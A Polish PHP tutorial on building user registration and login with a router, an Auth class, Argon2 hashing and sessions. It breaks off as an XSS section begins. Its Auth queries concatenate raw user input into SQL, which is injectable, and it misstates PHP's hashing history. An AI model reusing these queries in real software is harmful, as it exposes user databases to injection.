# Rejestracja i logowanie

Kolejną po **CRUD** funkcjonalnością backendową realizowaną w oparciu o system bazodanowy będzie system rejestracji i logowania. Jest to podstawa każdej aplikacji internetowej, która świadczy indywidualne widoki dla każdego użytkownika.

<details>
<summary>Zasoby do lekcji</summary>

<div style="display: flex;flex-direction: column;align-items: center;">
        <p>Avatary</p>
        <div style="display: flex;">
            <div style="display: flex;flex-direction: column;align-items: center;margin: 5px;">
                <img src="/public/Resources/php-files/awatary/AI_avatar_1.png" alt="Awatar wytworzony przez AI nr 1" style="height: 65px;width: 65px;border-radius: 50%;object-fit: cover;border: 2px solid #8d2121;">
                <code>AI_avatar_1.png</code>
            </div>
            <div style="display: flex;flex-direction: column;align-items: center;margin: 5px;">
                <img src="/public/Resources/php-files/awatary/AI_avatar_2.png" alt="Awatar wytworzony przez AI nr 2" style="height: 65px;width: 65px;border-radius: 50%;object-fit: cover;border: 2px solid #8d2121;">
                <code>AI_avatar_2.png</code>
            </div>
            <div style="display: flex;flex-direction: column;align-items: center;margin: 5px;">
                <img src="/public/Resources/php-files/awatary/AI_avatar_3.png" alt="Awatar wytworzony przez AI nr 3" style="height: 65px;width: 65px;border-radius: 50%;object-fit: cover;border: 2px solid #8d2121;">
                <code>AI_avatar_3.png</code>
            </div>
            <div style="display: flex;flex-direction: column;align-items: center;margin: 5px;">
                <img src="/public/Resources/php-files/awatary/AI_avatar_4.png" alt="Awatar wytworzony przez AI nr 4" style="height: 65px;width: 65px;border-radius: 50%;object-fit: cover;border: 2px solid #8d2121;">
                <code>AI_avatar_4.png</code>
            </div>
        </div>
    </div>

<details>
<summary>Login.html</summary>

<small>login.html</small>

```html
<!DOCTYPE html>
<html lang="pl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <a href="login.html">
        <h1>PLATFORMA</h1>
    </a>
    <header>
        <div class="panel">
            <h2>Rejestracja</h2>
            <form action="" method="get">
                <div class="input-wrap">
                    <label for="username">Nazwa użytkownika:</label>
                    <input type="text" name="username" id="username">
                </div>
                <div class="input-wrap">
                    <label for="login">Login: </label>
                    <input type="text" name="login" id="login">
                </div>
                <div class="input-wrap">
                    <label for="pass">Hasło: </label>
                    <input type="password" name="pass" id="pass">
                </div>
                <button>Zarejestruj się</button>
            </form>
        </div>
        <div class="panel">
            <h2>Logowanie</h2>
            <form action="" method="get">
                <div class="input-wrap">
                    <label for="login">Login: </label>
                    <input type="text" name="login" id="login">
                </div>
                <div class="input-wrap">
                    <label for="pass">Hasło: </label>
                    <input type="password" name="pass" id="pass">
                </div>
                <button>Zaloguj się</button>
            </form>
        </div>
    </header>
    <main>
        <section>
            <h3>Najnowszy wpis</h3>
            <div class="post">
                <div class="author">
                    <img src="./images/AI_avatar_1.png" alt="Awatar użytkownika ">
                    <small>Nazwa użytkownika</small>
                </div>
                <p>
                    W nowszych standardach PHP 8 nie podaje się już soli w password_hash
                </p>
            </div>
        </section>
        <section>
            <h3>Losowy wpis</h3>
            <p>Kolejne losowanie o 13:47</p>
            <div class="post">
                <div class="author">
                    <img src="./images/AI_avatar_3.png" alt="Awatar użytkownika ">
                    <small>Nazwa użytkownika</small>
                </div>
                <p>
                    Informatyka to zarządzanie dostępem do informacji i przetwarzanie jej.
                </p>
            </div>
        </section>
        <nav>
            <h3>Mało?</h3>
            <a href="all-posts.html" class="nav">Sprawdź wszystkie wpisy</a>
        </nav>
    </main>


</body>

</html>
```
</details>
<details>
<summary>all-posts.html</summary>

<small>all-posts.html</small>


```html
<!DOCTYPE html>
<html lang="pl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <a href="login.html">
        <h1>PLATFORMA</h1>
    </a>
    <header>

        <h2>Dodaj nowy wpis</h2>
        <form action="" method="post" class="post-form">
            <label for="new_post">Treść wpisu:</label>
            <textarea name="new_post" id="new_post" cols="51" rows="5" maxlength="255" minlength="20"></textarea>
            <button>Zapisz wpis</button>
        </form>
    </header>
    <main>
        <section>
            <h3>Wszystkie wpisy</h3>
            <div class="post">
                <div class="author">
                    <img src="./images/AI_avatar_1.png" alt="Awatar użytkownika ">
                    <small>Nazwa użytkownika</small>
                </div>
                <p>
                    W nowszych standardach PHP 8 nie podaje się już soli w password_hash
                </p>
            </div>
            <hr>
            <div class="post">
                <div class="author">
                    <img src="./images/AI_avatar_3.png" alt="Awatar użytkownika ">
                    <small>Nazwa użytkownika</small>
                </div>
                <p>
                    Informatyka to zarządzanie dostępem do informacji i przetwarzanie jej.
                </p>
            </div>
        </section>

    </main>
    <nav class="paginacja">
        <a href="?offset=1" class="active">1</a>
        <a href="?offset=2">2</a>
    </nav>

</body>

</html>
```

</details>

<details>
<summary>style.css</summary>

<small>style.css</small>

```css
:root {
    --color-text: #ebebeb;
    --muted-text: #ccc;
    --bg-layer-0: #111;
    --bg-layer-1: #474747;
    --table-border: #383838;
    --thead-tr: #383838;
    --tbody-tr-hover: #141414;
    --tbody-td-hover: #181818;
    --success: #296c29;
    --info: #315a72;
    --danger: #8d2121;
}

* {
    -webkit-text-stroke: 0.4px rgb(0 0 0 / 20%);
}

body {
    background-color: var(--bg-layer-0);
    color: var(--color-text);
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

#new-task {
    display: flex;
    align-items: center;
    justify-content: center;
}

h1 {
    color: #ccc;
}

button {
    cursor: pointer;
    border: 2px solid #fff2;
    border-radius: 5px;
    padding: 5px 10px;
    font-family: monospace;
    color: #fff;
    background-color: var(--success);
}

.panel {
    width: 250px;
    background-color: var(--tbody-td-hover);
    padding: 10px;
    margin: 10px;
}

.panel button {
    margin: 10px;
    width: 100%;
    max-width: 230px;
}

.panel form {
    width: 250px;
}



label {
    font-family: Verdana, Geneva, Tahoma, sans-serif;
}

label,
input {
    padding: 5px 10px;
    margin: 0 10px;
}

input {
    border: none;
    border-radius: 2px;
    color: var(--color-text);
    background-color: var(--bg-layer-1);
    display: block;
    width: 100%;
    max-width: 210px;
}

button:hover,
input[type="text"]:hover {
    filter: brightness(.9);
}

.paginacja {
    width: fit-content;
    margin: 0 auto;
    display: block;
}

.paginacja a {
    display: inline-block;
    height: 30px;
    width: 30px;
    background-color: var(--info);
    color: var(--color-text);
    text-align: center;
    font-size: 25px;
    margin: 0 3px;
    border-radius: 2px;
}

.paginacja a:hover {
    background-color: var(--success);
}

.paginacja a.active {
    background-color: var(--danger);
}

header {
    display: flex;
    justify-content: space-around;
    align-items: center;
    max-width: 1200px;
    margin: auto;
}

@media (max-width: 600px) {
    header {
        flex-direction: column;
    }
}

.post {
    max-width: 800px;
    margin: auto;
    background-color: var(--bg-layer-1);
    padding: 10px;
}

.post .author img {
    height: 45px;
    width: 45px;
    border-radius: 50%;
    object-fit: cover;
    border: 2px solid var(--danger);
}

.post .author {
    display: flex;
    align-items: center;
    gap: 5px;
    font-family: cursive;
}

.post-form {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 10px;
}

hr {
    width: 75%;
    max-width: 600px;
    border: 2px solid var(--bg-layer-1);
}

textarea {
    padding: 5px 10px;
}

textarea,
.post p {
    font-family: 'Times New Roman', Times, serif;
    font-size: .9rem;
    background-color: var(--tbody-td-hover);
    color: var(--color-text);

}

.post p {
    margin: -10px;
    padding: 30px 10px;

}


nav,
section:has(.post) {
    display: flex;
    flex-direction: column;
    align-items: center;
    margin: 50px;
    border-top: 3px solid var(--bg-layer-1);
}

nav {
    width: 60%;
    margin: auto;
    border-top: 3px solid var(--success);
}

a.nav {
    border: none;
    border-radius: 10px;
    background-color: #ffffff;
    color: #7300ed;
    padding: 5px 10px;
    margin-bottom: 30px;
    font-weight: bolder;
    transition: ease-out 300ms all;

}

a.nav:hover {
    color: #ffffff;
    background-color: #7300ed;
    transition: ease-in 300ms all;
}
```

</details>

</details>


## 💼 PHP i podejście projektowo-obiektowe

Wcześniej wykonaliśmy **CRUD**a strukturalnie pomijając całe OOP. Przy zrealizowaniu trywialnego systemu logowania można by było zrobić podobnie. Jednak wejdźmy na poziom wyżej. Niech nasz projekt zacznie mieć architekturę, zamiast zbioru plików.

Kolejnym dodatkiem który warto doinstalować w VS Code bedzie **Material Icon Theme** od *Philipp Kief*. Jak widzisz na poniższym obrazku to rozwiązanie ułatwia orientację topograficzną i zachęca do stosowania odpowiednich nazw by uzyskać danę ikonkę katalogu:

![Struktura katalogów projektu](/public/courses/php/Images/material-icon-theme-i-struktura-projektu.png)

Jak popatrzysz na powyższy obrazek to możesz już z tej struktury katalogowo-plikowej wywnioskować jakie będą założenia architektury aplikacji.

Mamy $3$ katalogi główne:
- `backend`: zawiera w sobie dwa kolejne katlogi rozdzielając logikę i funkcjonalności od widoków czyli komponetów z których po uprzedniej preparcaji i zasianiu danymi system wyrenderuje i zwróci to co odbiorca ma zobaczyć w przglądarce
- `CRUD`: Pliki z poprzedniej lekcji xP
- `resources`: zasoby które serwer po prostu bedzie zwracał klientowi, gdy ten poda do nich odpowiednią ścieżkę. Mamy tu arkusz stylu i obrazki.

Klasycznie w głównym katalogu tworzymy `index.php` i mamy też nowy plik bez nazwy ale z rozszerzeniem `.htaccess`.

## 🪧 Serwer Apache i <code>.htaccess</code>

Pliki `.htaccess` pozwalają na konfigurację serwera Apache w obrębie danego katalogu. Warto również doinstalować w VS Code **APACHE CONF** od *mrmlnc* dla kolorowania składni.

![](/public/courses/php/Images/apache-conf-addon-vs-code.png)

Po co nam w ogóle ten plik?
Jeżeli serwer na którym hostujemy stronę korzysta z Apache, a właśnie tak działa wiekszość internetu to ten plik opisuje wstępne zasady dostępu do zasobów.

> [!WARNING]
> Alternatywna usługa Nginx ignoruje pliki `.htaccess`

Na początku w pliku musimy włączyć ślinik przepisywania żądań do katalogu projektu:
```yaml
RewriteEngine On
```
Na początku określmy dostępy do obu głównych katalogów:
```yaml
# 1. Blokada katalogu backend (nikt nie pobierze plików PHP)
RewriteRule ^backend/ - [F]

# 2. Resources mają być dostępne normalnie
RewriteRule ^resources/ - [L]
```

- `RewriteRule`: zasada przepisania żądania
- `^`: dowolna ilość znaków w URL (najczęściej chodzi o relację domeny strony a głównym katalogiem projektu)
  - `[F]`: **_`Forbidden`_** - zabroniony dostęp `ERROR 403`
  - `[L]`: **`Last`** - ostatnia reguła, przerwij przetwarzanie, nie rób już nic więcej

Pozostało jeszcze wskazać plik który będzie obsługiwał zapytania. W tej strukturze średnio ma to sens ale gdyby `index.php` miał inną nazwę lub lokalizację to w ten sposób można na niego nakierować ruch:
```yaml
RewriteRule ^ index.php [L]
```

Spójrz na poniższy obrazek. Dostęp do katalogu `backend` jest zabroniony i jednocześnie zawartość katalogu `resources/images` pozostała dostępna. Jednak jest małe zastrzeżenie. Projekt musi zostać obsłużony przez Apache. Dlatego przeniosłem jego zawartość do `C:/xampp/htdocs/`.
![](/public/courses/php/Images/działąnie-htaccess.png)

Ok, no to mamy następującą konfigurację `.htaccesss`:

```yaml
RewriteEngine On
RewriteRule ^backend/ - [F]
RewriteRule ^resources/ - [L]
RewriteRule ^ index.php [L]
```



## 🛣️ Wyznaczanie tras - ładne linki URL

Na każdej stronie którą odwiedzasz w internecie nie spotkasz się rozszerzeniami `.html` ani `.php` w adresie URL. Za te ładniejsze linki odpowiadaja mechanizm routera czyli klasy decydującej jaki plik ma się wywołać dla tego konkretnego adresu.

Na początku zanim zaczniemy pisać trasowanie to przydało by się jakoś w php poznać wpisany adres URL. Wykorzystajmy do tego superglobalną `$_SERVER`. Odwoując się do wartości jej klucza `REQUEST_URI` otrzymamy resztę adresu po domenie i porcie.

Jak widzisz URI nie lubi się z znakami poza ASCI w tym polskimi.

![](/public/courses/php/Images/superglobalna-server-i-wartość-request_uri.png)

Przypiszmy wartość `$_SERVER['REQUEST_URI']` zmiennej $uri i wykorzystajmy ją w _**`switch`**_ dołączając odpowiednie pliki html przy pomocy `include_once`:

```php
$uri = $_SERVER["REQUEST_URI"];

switch($uri){
    case "/": 
        include_once("./backend/views/login.html"); 
        break;
    case "/wszystkie-wpisy": 
        include_once("./backend/views/all-posts.html"); 
        break;
    default: include_once("./backend/views/error404.html"); 
    break;
}
```
Jak widzisz w relatywnie krótkim kodzie udało się zaimplementować ładne adresy i ukryć faktyczne nazwy plików. Przykładowo po wpisaniu `http://localhost/wszystkie-wpisy` php zwróci zawartość pliku `all-posts.html`.

![](/public/courses/php/Images/powizoryczny-router.png)

Ale CSS się nie załadował! W obu plikach zmień:

```html
<link rel="stylesheet" href="style.css">
```
na
```html
<link rel="stylesheet" href="./resources/css/style.css">
```

## 📝 Rejestracja użytkownika

Zmodyfikuj formularz rejestracji w pliku `login.html` dodając do atrybutu `action` wartość `/register`. Dodaj też brakującą kontrolkę do powtórnego wpisania hasła.  
Zobacz że formularz przesyłamy metodą *`GET`*, więc w adresie URL będą dopisane zmienne z formularza. co za tym idzie w pliku `router.php` przekształcimy metodą `explode` uzyskane URI na tablicę separując elementy znakiem `?` i inicjalizując zmienną `$uri` pierwszym elementem tej tablicy:

```php
$uri = \explode("?", (string)$_SERVER["REQUEST_URI"])[0];
```

Dzieki temu gdy adres wygląda tak:
```
http://localhost/register?username=xD&login=xddd&pass=Has%C5%82o&repass=Powt%C3%B3rz+has%C5%82o
```
to w zmiennej `$uri` będzie tylko: `/register`

---

Przygotujmy teraz połączenie z bazą danych, bedziemy je przekazywać do instancji klas które będą wywoływać jakieś zapytania:

```php
$db = null;
try {
    $db = @new mysqli("localhost", "root", "");
} catch (Exception $e) {
    echo "Błąd bazy danych: " . $e->getMessage();
    exit();
}
```
> Jeżeli nie uda nam się połączyć to przy pomocy `exit()` przerywamy dalsze wykonywanie kodu i zatrzymujemy całą aplikację.

## 🪪 Klasa Auth

Całą obsługą autoryzacji czyli logowaniem i rejestracją zajmie się klasa `Auth`  
W katalogu `/backend/core/` utwórz odpowiedni plik (`Auth.php`) o następującej zawartości:

```php
<?php
declare(strict_types=1);
class Auth{

    private $db;
    function __construct(mysqli $db){
        $this->db=$db;
    }
}
```
> Klasycznie deklarujemy ścisły tryb typowania i tworzymy konstruktor klasy do której przekażemy uprzednio stworzone połączenie z bazą danych.

Napiszmy teraz publiczną funkcję do rejestracji, która przyjmuje parametry: `username`, `login`, `pass`, `repass`:
```php
public function register(string $username, string $login, string $pass, string $repass): string{
    return "Nie zaimlepmentowano jeszcze.";
}
```

Zanim przejdziemy do implementcji upewnijmy się że jesteśmy w stanie poprawnie ją wywołać.  
Na początku w `router.php`  za pomocą `require_once` doklejmy jej definicję: 

```php
require_once("./backend/core/Auth.php");
```
Teraz możemy utworzyć dedykowany przypadek w switchu dla uri `/register`. Gdzie do nowej instancji klasy przekazujemy połączenie z bazą danych i wywołujemy jej publiczną metodę `register()` przekazując dane formularza z zapytania *`GET`*.

Aktualny stan (zwróć uwagę że nie ma `brake;` przed `case "/":`. Dzieki temu dla `/register` wywoła się też kod z `case "/":`):

<small>router.php</small>

```php
<?php
declare(strict_types=1);
require_once("./backend/core/Auth.php");
$uri = \explode("?", (string)$_SERVER["REQUEST_URI"])[0];
echo $uri;
$db = null;
try {
    $db = @new mysqli("localhost", "root", "");
} catch (Exception $e) {
    echo "Błąd bazy danych: " . $e->getMessage();
    exit();
}
switch($uri){
    case "/register": 
        $action = new Auth($db);
        echo $action->register($_GET["username"], $_GET["login"], $_GET["pass"], $_GET["repass"]);
    case "/": 
        include_once("./backend/views/login.html"); 
        break;
    case "/wszystkie-wpisy": 
        include_once("./backend/views/all-posts.html"); 
        break;
    default: include_once("./backend/views/error404.html"); 
    break;
}
```

![](/public/courses/php/Images/struktura-auth-bez-pełnej-implementacji-register.png)

## ⚠️ Problem z nieistniejącymi zmiennymi

Zobaczmy co się stanie gdy ręcznie przejdziemy na adres `http://localhost/register`:

![](/public/courses/php/Images/register-router-errors-variable.png)

Do Auth przekazaliśmy nie istniejące zmienne.  
Najprościej będzie to poprawić instrukcją warunkową _**`if`**_:
```php
if(isset($_GET["username"]) && isset($_GET["login"]) && isset($_GET["pass"]) && isset($_GET["repass"])){
    $action = new Auth($db);
    echo $action->register($_GET["username"], $_GET["login"], $_GET["pass"], $_GET["repass"]);
}
```

## 🗄️ Tworzenie bazy danych i tabeli

W pliku `index.php` zawrzemy kod który prześle do serwera bazodanowego zapytania SQL tworząc nową bazę danych `platforma` a w niej dwie tabele:
- `users`: do przechowywania danych użytkowników  
- `posts`: do przechowywania wpisów

```php
<?php
declare(strict_types=1);

const host = "localhost";
const user = "root";
const password = "";

$db = null;
try {
    $db = @new mysqli(host, user, password);
} catch (Exception $e) {
    echo "Błąd bazy danych: " . $e->getMessage();
}
$sql = 'CREATE DATABASE IF NOT EXISTS platforma;
        CREATE TABLE IF NOT EXISTS platforma.users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            login VARCHAR(255),
            password VARCHAR(255),
            username VARCHAR(255),
            avatar TEXT,
            role SET("user", "admin")
        );
        CREATE TABLE IF NOT EXISTS platforma.posts (
            id INT AUTO_INCREMENT PRIMARY KEY,
            author INT,
            content VARCHAR(255)
        );';
$db->multi_query($sql);
$db->close();

require_once("./backend/core/router.php");
```

> Pamiętaj by zmodyfikować połączenie mysqli inicjalizowane do zmiennej `$db` o czwarty parametr nazwy tej bazy danych.

## 🛠️ Implementacja metody rejestracji

Wracamy do klasy `Auth`. Po switchu przygotujmy zmienną z zapytaniem `INSERT`:
```php
$sql = 'INSERT INTO users 
            (login, password, username, role)
            VALUES(
                "' . $login .'",
                "' . $pass .'",
                "' . $username .'",
                "user"
            )';
```

Na pierwszy rzut oka wszystko jest w porządku i faktycznie kod działa bez zarzutów... ALE 🤨  
Zobacz że przechowujemy hasło jako `plaintext` (jawnie).
![](/public/courses/php/Images/rejestracja-udana.png)

### #️⃣ Hashe haseł

**Hash** to funkcja matematyczna, która przyjmuje ciąg znaków o dowolnej długości i zwraca wartość o stałej długości. Przy procesie haszowania zachodzi utrata pierwotnej informacji co uniemorzliwia jej odtworzenie więc nie jest to szyfrowaniem. Jednakże poprawny algorytm hasujący przy tych samych danych wejściowych zwruci zawsze ten sam klucz hashu.

$Hash("haslo", sól1) = $ but#2ga4

$Hash("haslo", sól2) = $ but#2gc4

$Hash("hoslo", sól1) = $ cud#2ga5

Od $PHP8$ rozpoczęto ulepszanie metod powiązanych z bezpieczeństwem haseł. Celem jest odejście od algorytmu **MD5** na rzecz **Argon2**. Wydłużając istotnie czasy trwania ataku brute-force przy użyciu kart graficznych i maszyn opartych o przetwarzanie GPU. Chodź **Argon2** jest dostępny już od $PHP7.2$ to dalej trwają prace nad pełną integracją i poprawę stabilności algorytmu. Przy wydaniu $PHP8.4$ ostateczne odejście od algorytmu **MD5** jest wdrożone. Widać to w dokumentacji że przy nowych projektach sugerowane jest użycie **Argon2**.

Możesz pozostać przy minimalnym zapisie:

```php
$pass = password_hash($pass, PASSWORD_DEFAULT);
```

Jednak rekomendowana forma wygląda następująco:
```php
$options = [
    'memory_cost' => PASSWORD_ARGON2_DEFAULT_MEMORY_COST,
    'threads' => PASSWORD_ARGON2_DEFAULT_THREADS,
    'time_cost' => PASSWORD_ARGON2_DEFAULT_TIME_COST
];
$pass = password_hash($pass, PASSWORD_ARGON2ID, $options);
```
Dla ułatwienia pamietaj że snipety mają ci pomagać więc jeżeli wpiszesz dużymi literami `PASS` to IDE powinno samo podpowiedzieć ci dostępne opcje.

![](/public/courses/php/Images/ułatwienie-podawania-opcji-do-argon2.png)

Dzięki temu brut-force trwa znacznie dłużej a rainbow-table staje się praktycznie bezużyteczne. 

> [!TIP]
> **BRUTE-FORCE** to metoda ataku mająca na celu odgadnięcie hasła poprzez systematyczne sprawdzanie wszystkich możliwych kombinacji znaków. By ją przyspieszyć proces ten jest przekazywany na karty graficzne **GPU**. Podstawą ochrony przed atakiem brute-force jest jak najdłuższe odwlekanie i spowalnianie go. Np.: po $3$ nieudanych próbach logowania konto jest blokowane na $15$ minut.
> **RAINBOW-TABLE** to tabela zawierająca hashe haseł. Jest ona używana do odgadywania haseł poprzez porównywanie hashy haseł z hashami haseł w tabeli. Bierzesz duże zbiory hashy z różnych baz danych, które wyciekły i szukasz wzorców. Podstawowa Sól stosowana automatycznie przez `password_hash()` jest wystarczająca by zablokować tęczową tabelę.


Jak faktycznie zabezpieczyć przechowywane hashe przed **BRUTE-FORCE**?  
Do hasła oprócz dobrej soli należy dodać papryczkę.

```php
$pepper = $_ENV['PEPPER'];
$pwd_peppered = hash_hmac("sha256", $password, $pepper);
$hash = password_hash($pwd_peppered, PASSWORD_ARGON2ID);
```

W takim przypadku **BRUTE-FORCE** nie ma sensu ponieważ cyber-przestępca musiał by poznać sól która jest w wyniku ukryta haszowania oraz papryczkę. Czyli by poznać hasło musi musi użyć jego wartość zaszyfrowaną kluczem papryczki i ten wynik użyć w hashowaniu by otrzymać ten sam hash. 

> Pewnie zauważyłeś że w kodzie jest podana superglobalna $_ENV['PEPPER']. Jest to zmienna środowiskowa z pliku **.env**. Jak tylko rozpoczniemy pracę przy composer'ze to wykorzystamy do niej odpowiednią bibliotekę.


---

Wprowadźmy małą zmianę dotyczącą formularzy rejestracji i logowania. Jak widzisz *`GET`* sprawia że dane są widoczne w adresie URL. Jest to problematyczne przy poufnych danych, więc zmieńmy metodę z *`GET`* na **`POST`** w formularzach. Nie bedzie to oznaczało że dane są bezpieczniejsze, ale nie będą tak obwjus na widoku.

![](/public/courses/php/Images/zmienne-get-w-url.png)

Dla ułatwienia masowej edycji skorzystaj z funkcji „Znajdź i zamień”.  
Zaznaczamy interesujący fragment np `$_GET` i używamy skrótu <kbd>Ctrl</kbd> + <kbd>F2</kbd>.

![](/public/courses/php/Images/zmiana-z-get-na-post.png)

> Do przełączania się miedzy zawijaniem wierszy w VS Code użyj skrótu <kbd>Alt</kbd> + <kbd>Z</kbd>.

---

Na aktualnym poziomie papryczką się nie przejmujemy. Użytkownik się zarejestrował i ma poprawne dane w bazie danych `http://localhost/phpmyadmin/`:

![](/public/courses/php/Images/user-z-hashem-hasła-w-bd.png)

<details>
<summary>Aktualny stan <code>Auth.php</code></summary>

```php
<?php
declare(strict_types=1);
class Auth{

    private $db;
    function __construct(mysqli $db){
        $this->db=$db;
    }
    public function register(string $username, string $login, string $pass, string $repass): string{
        switch($this->validateRegisterData($login, $pass, $repass)){
            case 1: return "Hasła nie są takie same.";
            case 2: return "Ten login jest już zajęty.";
        }
        $options = [
            'memory_cost' => PASSWORD_ARGON2_DEFAULT_MEMORY_COST,
            'threads' => PASSWORD_ARGON2_DEFAULT_THREADS,
            'time_cost' => PASSWORD_ARGON2_DEFAULT_TIME_COST
        ];

        $pass = password_hash($pass, PASSWORD_ARGON2ID, $options);

        $sql = 'INSERT INTO users 
            (login, password, username, role)
            VALUES(
                "' . $login .'",
                "' . $pass .'",
                "' . $username .'",
                "user"
            )';
        $this->db->query($sql);
        return "Rejestracja się powiodła. Możesz się już zalogować.";
    }

    private function validateRegisterData(string $login, string $pass, string $repass): int{
        if($pass !== $repass){
            return 1;
        }
        $sql='SELECT * FROM users WHERE login = "' . $login .'"';
        $result = $this->db->query($sql);
        if($result->num_rows !== 0){
            return 2;
        }
        return 0;
    }


    public function login(string $login, string $pass): string{

        return "Nie zaimlepmentowano jeszcze.";
    }

}
```

</details>

## 🛠️ Implementacja metody logowania

Rejestracja gotowa, więc czas na zaimplementowanie logowania.

Na podstawie loginu wyszukamy cza danu użytkownik istnieje, a jak tak to dopiero wtedy bedziemy działać dalej z weryfikacją poprawności podanego hasła.

Standardowo przygotowujemy zapytanie SQL spreparowane zmienną wysyłamy do bazy danych i w pierwszym kroku sprowadzamy ile jest wyników.

Jeżeli z zapytania mamy krotkę to pole o atrybucie `password` przekazujemy wraz z inputem hasła użytkownika do prywatnej funkcji pomocniczej, która zdecyduje czy wartości obu argumentów są tożsame.

```php
    public function login(string $login, string $pass): string
    {
        $sql = 'SELECT * FROM users WHERE login="' . $login . '"';
        $result = $this->db->query($sql);

        if ($result->num_rows == 0) {
            return "Podano niepoprawne dane.";
        }

        $this->validatePasswordHash($pass, $result->fetch_assoc()["password"]);

        return "Nie zaimlepmentowano jeszcze.";
    }
    private function validatePasswordHash($passInput, $passHash)
    {
        
    }
```

Zobacz że na poniższym obrazku metody `validateRegisterData()` i `login()` mają praktycznie identyczny blok kodu, wiec warto go wyekstrahować do osobnej funkcji.

![](/public/courses/php/Images/początkowa-implementacja-logowania.png)

> [!IMPORTANT]
> Zadanie dla Ciebie!
> Dokonaj refaktoryzacji metod `validateRegisterData()` i `login()` wytwarzając nową prywatną metodę z której będą one korzystać, tak by nie zmienić nic w metodzie `register`. Zacznij od takiej deklaracji:
> ```php
> private function getDataAsLogin(string $login): array {
>     
> }
> ```

<details>
<summary>Rozwiązanie powyższej refaktoryzacji</summary>

```php
    private function validateRegisterData(string $login, string $pass, string $repass): int
    {
        if ($pass !== $repass) {
            return 1;
        }

        $result = $this->getDataAsLogin($login);

        if (count($result) !== 0) {
            return 2;
        }

        return 0;
    }
    private function getDataAsLogin(string $login): array
    {
        $sql = 'SELECT * FROM users WHERE login = "' . $login . '"';
        $result = $this->db->query($sql);

        if ($result->num_rows == 0) {
            return [];
        }

        return $result->fetch_assoc();
    }
    public function login(string $login, string $pass): string
    {
        $result = $this->getDataAsLogin($login);
        if (count($result) == 0) {
            return "Podano niepoprawne dane.";
        }

        if (!$this->validatePasswordHash($pass, $result["password"])) {
            return "Podano nieprawidłowe hasło";
        }

        return "Logowanie się powiodło";
    }
```

![](/public/courses/php/Images/refaktoryzacja-auth-metod-pomocniczych-do-loginu.png)

</details>

### 🔬 Walidacja wpisanego hasła z hashem

Dokonczymy naszą prywatną metodę `validatePasswordHash` i wykorzystajmy do tego celu wbudowaną funkcje `password_verify()`.

Jej działanie jest proste, przyjmuje dwa parametry, pierwszy to wpisane hasło przez użytkownika, drugi to hash zapisany w bazie danych. Zwraca true jeśli hasło jest poprawne, false w przeciwnym wypadku. 

```php
var_dump(password_verify($passInput, $passHash));
```
> Pamietamy że PHP lubi nie wyświetlić w zwracanej stronie typu `text\html` wartości dla zmiennych Boolowskich, więc należy użyć var_dump.

![](/public/courses/php/Images/implementacja-password_verify.png)


Całe logowanie aktualnie opiera się o te dwie metody:
```php
public function login(string $login, string $pass): string{
    $result = $this->getDataAsLogin($login);
    if (count($result) == 0) {
        return "Podano niepoprawne dane.";
    }

    if (!$this->validatePasswordHash($pass, $result["password"])) {
        return "Podano nieprawidłowe hasło";
    }

    return "Logowanie się powiodło";
}
private function validatePasswordHash(string $passInput, string $passHash): bool{
    return password_verify($passInput, $passHash);
}
```

Realnie nasz system dodaje użytkownika do bazy danych i potrafi sprawdzić czy istnieje w niej ktoś z takim loginem i hasłem.  
Dla klienta końcowego to dalej za mało.

## 🔰 Widok strony względem stanu zalogowania

Formularze rejestracji i logowania powinny być widoczne dla niezalogowanych w innym przypadku klient powinien zobaczyć opcję wylogowania się.

Wytnijmy więc z pliku `login.html` cały tag `<header>` i umieścimy go w nowym pliku `register_login_section.html`, a miejsce w którym się znajdował zastąpimy `%%register_login_section%%`.

Nasz `case "/":` w pliku `router.php` będzie wyglądał tak:

```php
$loginPage = file_get_contents("./backend/views/login.html");
$register_login_section = file_get_contents("./backend/views/register_login_section.html");

$loginPage = str_replace("%%register_login_section%%", $register_login_section, $loginPage);

echo $loginPage;
```

Nic się nie zmieniło, to dobrze.
![](/public/courses/php/Images/preparacja-strony-login.png)

### 🗃️ Sesja użytkownika

Aktualnie nasz użytkownik może się zalogować, ale nic się nie dzieje. Musimy skorzystać z mechanizmu sesji.

Jeżeli w danym pliku PHP wywołamy funkcje `session_start()`, PHP rozpocznie nową sesję lub połączy nas z istniejącą. By PHP wiedziała że dane z sesji są powiązane z konkretnym klientem czyli przeglądarką wysyła do niej ciasteczko **PHPSESSID**,które to w kolejnych żądaniach będzie doklejane.

![](/public/courses/php/Images/session_start-i-ciasteczko-PHPSESSID.png)

Dzieki temu możemy zdecydować który wariant strony ma zostać wyświetlony:
- wariant z formularzami rejestracji i logowania
- wariant z powitaniem

W `Auth->login()` przed zwruceniem pozytywnego komunkatu przez return na koniec metody zapiszmy resultad zapytania sql by przechwycić dane o użytkowniku.

```php
$_SESSION["user"] = $result;
return "Logowanie się powiodło";
```

Następnie zastąpmy standardowe użycie `echo` dla wyników metod `register()` i `login()` w pliku `router.php` przypisując je do zmiennych.

Oraz w pliku `register_login_section.html` pod przyciskami formularzy w znaczniku `<p>` dopiszmy „haczyki” dla _**`str_replace()`**_.

Wtedy w `case "/":` zapisujemy $3$ _**`if else`**_ sprawdzające istnienie:
- komunikatu rejestracji,
- komunikatu logowania,
- danych użytkownika.

Na tej podstawie kod decyduje czy w miejscu "haczyka" wstawiamy jakąś wartość czy zastępujemy go pustym ciągiem znaków `""` (empty).

![](/public/courses/php/Images/strona-po-zalogowaniu-z-ciasteczkiem-sessji.png)

> Odśwież sobie pare razy stronę i zobacz że w nagłówkach żądania zawsze pojawia się ciasteczko `PHPSESSID` o tym samym identyfikatorze.

## 🔴 Atak XSS (Cross-Site Scripting)

**XSS** (*Cross-Site Scripting*, skrót zapisywany jako *XSS*, aby nie mylić go z arkuszami stylów *CSS*) to jeden z najczęstszych i najgroźniejszych ataków w aplikacjach webowych według **OWASP Top 10**. 

Polega na **wstrzyknięciu złośliwego kodu JavaScript** do struktury strony HTML. Kod ten jest następnie przesyłany z serwera i **wykonywany w przeglądarce innego użytkownika** (często administratora lub zwykłego klienta serwisu), który odwiedza zainfekowaną stronę.

> [!CAUTION]
